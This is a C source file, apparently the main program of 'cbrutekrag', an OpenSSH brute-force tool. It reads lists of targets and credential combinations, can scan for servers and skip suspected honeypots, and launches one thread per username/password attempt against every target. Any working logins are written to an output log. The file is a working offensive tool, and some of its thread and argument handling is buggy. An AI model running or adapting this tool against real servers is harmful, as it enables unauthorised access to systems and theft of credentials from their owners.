/*
Copyright (c) 2014-2018 Jorge Matricali

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <getopt.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h> /* clock */

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
// #include <process.h>
#else
#include <execinfo.h> /* backtrace, backtrace_symbols_fd */
#include <signal.h>
#include <sys/resource.h> /* rlimit */
#include <sys/wait.h> /* waitpid */
#include <unistd.h> /* for usleep() */
#endif

#include <pthread.h>

#include "bruteforce_ssh.h"
#include "cbrutekrag.h"
#include "credentials.h"
#include "detection.h"
#include "log.h"
#include "progressbar.h"
#include "str.h"
#include "target.h"

#define NANO_PER_SEC 1000000000.0

int g_verbose = 0;
char *g_output_format = NULL;

void print_banner()
{
	printf("\033[92m           _                _       _\n"
	       "          | |              | |     | |\n"
	       "\033[37m      ___\033[92m | |__  _ __ _   _| |_ ___| | ___ __ __ _  __ _\n"
	       "\033[37m     / __|\033[92m| '_ \\| '__| | | | __/ _ \\ |/ / '__/ _` |/ _` |\n"
	       "\033[37m    | (__ \033[92m| |_) | |  | |_| | ||  __/   <| | | (_| | (_| |\n"
	       "\033[37m     \\___|\033[92m|_.__/|_|   \\__,_|\\__\\___|_|\\_\\_|  \\__,_|\\__, |\n"
	       "              \033[0m\033[1mOpenSSH Brute force tool 0.6.0\033[0m\033[92m        __/ |\n"
	       "          \033[0m(c) Copyright 2014-2022 Jorge Matricali\033[92m  |___/\033[0m\n\n");
}

void usage(const char *p)
{
	printf("\nusage: %s [-h] [-v] [-aA] [-D] [-P] [-T TARGETS.lst] [-C credentials.lst]\n"
	       "\t\t[-t THREADS] [-F OUTPUT FORMAT] [-o OUTPUT.txt] [TARGETS...]\n\n",
	       p);
}

void err_handler(int sig)
{
	log_error("Error: signal %d:\n", sig);

#ifndef _WIN32
	void *array[10];
	int size;

	size = backtrace(array, 10);

	backtrace_symbols_fd(array, size, STDERR_FILENO);
#endif
	exit(EXIT_FAILURE);
}

static size_t btkg_get_max_threads(void)
{
#ifndef _WIN32
	struct rlimit limit;

	/* Increase the maximum file descriptor number that can be opened by this process. */
	getrlimit(RLIMIT_NOFILE, &limit);
	limit.rlim_cur = limit.rlim_max;
	setrlimit(RLIMIT_NOFILE, &limit);

	return (limit.rlim_cur > 1024) ? 1024 : limit.rlim_cur - 8;
#else
	// TODO: Get real max threads available under Windows
	return 1024;
#endif
}

typedef struct {
	btkg_context_t *context;
	btkg_target_t *target;
	btkg_credentials_t credentials;
	size_t index;
	size_t total;
	FILE *output;
} thread_data_t;

void *thread_function(void *data)
{
	thread_data_t *thread_data = (thread_data_t *)data;
	btkg_context_t *context = thread_data->context;
	btkg_target_t *target = thread_data->target;
	btkg_credentials_t credentials = thread_data->credentials;
	size_t index = thread_data->index;
	size_t total = thread_data->total;
	FILE *output = thread_data->output;
	int ret = EXIT_SUCCESS;

	if (!context->dry_run) {
		ret = bruteforce_ssh_try_login(
			context, target->host, target->port, credentials.username,
			credentials.password, index, total, output);
	}

	pthread_exit((void *)(intptr_t)ret);
}

int main(int argc, char **argv)
{
	int opt;
	size_t total = 0;
	char *hostnames_filename = NULL;
	char *credentials_filename = NULL;
	char *output_filename = NULL;
	FILE *output = NULL;
	btkg_context_t context = { 3, 1, 0, 0, 0, 0, 0, 0 };
	struct timespec start, end;
	double elapsed;
	int tempint;

	/* Error handler */
	signal(SIGSEGV, err_handler);

#ifndef _WIN32
	/* Ignore SIGPIPE */
	signal(SIGPIPE, SIG_IGN);
#endif

	/* Calculate maximun number of threads. */
	context.max_threads = btkg_get_max_threads();

	context.timeout = 1;

	while ((opt = getopt(argc, argv, "aAT:C:t:o:F:DsvVPh")) != -1) {
		switch (opt) {
			case 'a':
				context.non_openssh = 1;
				break;
			case 'A':
				context.allow_honeypots = 1;
				break;
			case 'v':
				context.verbose |= CBRUTEKRAG_VERBOSE_MODE;
				g_verbose = context.verbose;
				break;
			case 'V':
				context.verbose |= CBRUTEKRAG_VERBOSE_SSHLIB;
				break;
			case 'T':
				hostnames_filename = strdup(optarg);
				break;
			case 'C':
				credentials_filename = strdup(optarg);
				break;
			case 't':
				tempint = atoi(optarg);
				if (tempint < 1) {
					log_error("Invalid threads size. (%d)",
						  tempint);
					exit(EXIT_FAILURE);
				}
				context.max_threads = (size_t)tempint;
				break;
			case 'F':
				g_output_format = strdup(optarg);
				btkg_str_replace_escape_sequences(
					g_output_format);
				break;
			case 'o':
				output_filename = strdup(optarg);
				break;
			case 's':
				context.perform_scan = 1;
				break;
			case 'D':
				context.dry_run = 1;
				break;
			case 'P':
				context.progress_bar = 1;
				break;
			case 'h':
				print_banner();
				usage(argv[0]);
				printf("  -h                This help\n"
				       "  -v                Verbose mode\n"
				       "  -V                Verbose mode (sshlib)\n"
				       "  -s                Scan mode\n"
				       "  -D                Dry run\n"
				       "  -P                Progress bar\n"
				       "  -T <targets>      Targets file\n"
				       "  -C <credentials>  Username and password file\n"
				       "  -t <threads>      Max threads\n"
				       "  -o <output>       Output log file\n"
				       "  -F <format>       Output log format\n"
				       "                    Available placeholders:\n"
				       "                    %%DATETIME%%, %%HOSTNAME%%\n"
				       "                    %%PORT%%, %%USERNAME%%, %%PASSWORD%%\n"
				       "  -a                Accepts non OpenSSH servers\n"
				       "  -A                Allow servers detected as honeypots.\n");
				exit(EXIT_SUCCESS);
			default:
				usage(argv[0]);
				exit(EXIT_FAILURE);
		}
	}
	print_banner();

	/* Targets */
	btkg_target_list_t *targets = btkg_target_list_create();

	while (optind < argc) {
		btkg_target_t *ret = btkg_target_parse(argv[optind]);

		if (ret == NULL) {
			log_error(
				"WARNING: An error ocurred parsing target '%s' on argument #%d",
				argv[optind], optind);
			continue;
		}

		btkg_target_list_append_range(targets, ret->host, ret->port);
		free(ret->host);
		free(ret);
		optind++;
	}

	if (targets->targets == NULL && hostnames_filename == NULL)
		hostnames_filename = strdup("hostnames.txt");

	if (hostnames_filename != NULL) {
		btkg_target_list_load(targets, hostnames_filename);
		free(hostnames_filename);
	}

	if (credentials_filename == NULL)
		credentials_filename = strdup("combos.txt");

	/* Load username/password combinations */
	btkg_credentials_list_t credentials_list;
	btkg_credentials_list_init(&credentials_list);
	btkg_credentials_list_load(&credentials_list, credentials_filename);
	free(credentials_filename);

	/* Calculate total attempts */
	total = targets->length * credentials_list.length;

	printf("\nAmount of username/password combinations: %zu\n",
	       credentials_list.length);
	printf("Number of targets: %zu\n", targets->length);
	printf("Total attempts: %zu\n", total);
	printf("Max threads: %zu\n\n", context.max_threads);

	if (total == 0) {
		log_error("No work to do.");
		exit(EXIT_FAILURE);
	}

	if (context.max_threads > targets->length) {
		log_info("Decreasing max threads to %zu.", targets->length);
		context.max_threads = targets->length;
	}

	/* Output Format */
	if (g_output_format == NULL) {
		g_output_format = strdup(
			"%DATETIME%\t%HOSTNAME%:%PORT%\t%USERNAME%\t%PASSWORD%\n");
	}

	/* Output file */
	if (output_filename != NULL) {
		output = fopen(output_filename, "a");
		if (output == NULL) {
			log_error("Error opening output file. (%s)",
				  output_filename);
			exit(EXIT_FAILURE);
		}
	}
#ifdef _WIN32
	/* Initialize WinSock */
	WSADATA wsa_data;
	if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
		fprintf(stderr, "WSAStartup failed.\n");
		exit(1);
	}
#endif

	/* Port scan and honeypot detection */
	if (context.perform_scan) {
		log_info("Starting servers discoverage process...");
		clock_gettime(CLOCK_MONOTONIC, &start);
		detection_start(&context, targets, targets,
				context.max_threads);
		clock_gettime(CLOCK_MONOTONIC, &end);
		elapsed = (double)(end.tv_sec - start.tv_sec);
		elapsed += (double)(end.tv_nsec - start.tv_nsec) / NANO_PER_SEC;
		log_info("Detection process took %f seconds.", elapsed);
		log_info("Number of targets after filtering: %zu.",
			 targets->length);
	}

	if (targets->length == 0) {
		log_info("No work to do.");
		exit(EXIT_SUCCESS);
	}

	if (context.max_threads > targets->length) {
		log_info("Decreasing max threads to %zu.", targets->length);
		context.max_threads = targets->length;
	}

	/* Bruteforce */
	pthread_t *threads =
		(pthread_t *)malloc(context.max_threads * sizeof(pthread_t));
	thread_data_t *thread_data = (thread_data_t *)malloc(
		context.max_threads * sizeof(thread_data_t));
	size_t count = 0;

	log_info("Starting brute-force process...");
	clock_gettime(CLOCK_MONOTONIC, &start);

	for (size_t x = 0; x < credentials_list.length; x++) {
		btkg_credentials_t credentials =
			credentials_list.credentials[x];

		for (size_t y = 0; y < targets->length; y++) {
			btkg_target_t *current_target = &targets->targets[y];

			thread_data[count].context = &context;
			thread_data[count].target = current_target;
			thread_data[count].credentials = credentials;
			thread_data[count].index = count;
			thread_data[count].total = total;
			thread_data[count].output = output;

			if (pthread_create(&threads[count], NULL,
					   thread_function,
					   &thread_data[count]) != 0) {
				log_error("Failed to create thread!");
				exit(EXIT_FAILURE);
			}

			count++;
		}
	}

	/* Wait until all threads finish their work */
	for (size_t i = 0; i < count; i++) {
		void *ret;
		printf("Joining thread: %ld\n", count);
		pthread_join(threads[i], &ret);
	}

	free(threads);
	free(thread_data);

	clock_gettime(CLOCK_MONOTONIC, &end);
	elapsed = (double)(end.tv_sec - start.tv_sec);
	elapsed += (double)(end.tv_nsec - start.tv_nsec) / NANO_PER_SEC;

	if (context.progress_bar)
		progressbar_render(count, total, NULL, 0);

	log_info("Brute-force process took %f seconds.", elapsed);

	btkg_credentials_list_destroy(&credentials_list);
	btkg_target_list_destroy(targets);

	if (output != NULL)
		fclose(output);

	exit(EXIT_SUCCESS);
}
